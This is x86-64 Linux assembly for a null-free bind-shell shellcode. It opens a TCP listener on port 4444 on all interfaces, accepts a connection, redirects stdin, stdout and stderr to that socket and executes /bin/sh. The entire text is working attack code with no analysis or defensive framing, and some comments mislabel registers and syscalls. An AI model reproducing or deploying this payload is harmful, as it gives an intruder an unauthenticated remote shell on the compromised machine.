global _start
_start:
; sock = socket(AF_INET, SOCK_STREAM, 0)
xor rdi, rdi ; rdi=0x0
mul rdi      ; rax&rdx=0x0
add rax, 41  ; socket syscall number 41 
add rdi, 2   ; AF_INET=0x2
push rdx
pop rsi
inc rsi      ; rsi=0x1=SOCK_STREAM
syscall
mov rdi, rax ; rdi=socket-fd
; server.sin_family = AF_INET 
; server.sin_port = htons(PORT)
; server.sin_addr.s_addr = INADDR_ANY
; bzero(&server.sin_zero, 8)
dec rsi
mul rsi
add al, 0x31     ; rax = 0x31 = socket syscall
push rdx         ; 8 bytes of zeros for second half of struct
push dx          ; 4 bytes of zeros for IPADDR_ANY
push dx          ; 4 bytes of zeros for IPADDR_ANY
push word 0x5c11 ; push 2 bytes for TCP Port 4444
inc rdx
inc rdx          ; rdx = 0x2 ; dx = 0x0002
push dx          ; 0x2 = AF_INET
add dl, 0xe      ; rdi = 0x10 = sizeof(ipSocketAddr)
mov rsi, rsp     ; rsi = &ipSocketAddr
syscall
; listen(sock, MAX_CLIENTS)
mul rsi      ; rax&rdx=0x0
add rax, 50
inc rsi
inc rsi
syscall
; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
mul rdx
add rax, 43
sub rsp, 16
mov rsi, rsp
mov byte [rsp-1], 16
sub rsp, 1
mov rdx, rsp
syscall
; store the client socket description 
mov r9, rax 
; close parent
xor rax, rax
add rax, 3
syscall
; duplicate sockets
; dup2 (new, old)
xor rsi, rsi
mul rsi
mov rdi, r9
add rax, 33
push rax
syscall
pop rax
push rax
inc rsi
syscall
pop rax
push rax
inc rsi
syscall
; execve
xor rax, rax
push rax
; push /bin//sh in reverse
mov rbx, 0x68732f2f6e69622f
push rbx
; store /bin//sh address in RDI
mov rdi, rsp
; Second NULL push
push rax
; set RDX
mov rdx, rsp
; Push address of /bin//sh
push rdi
; set RSI
mov rsi, rsp
; Call the Execve syscall
add rax, 59
syscall
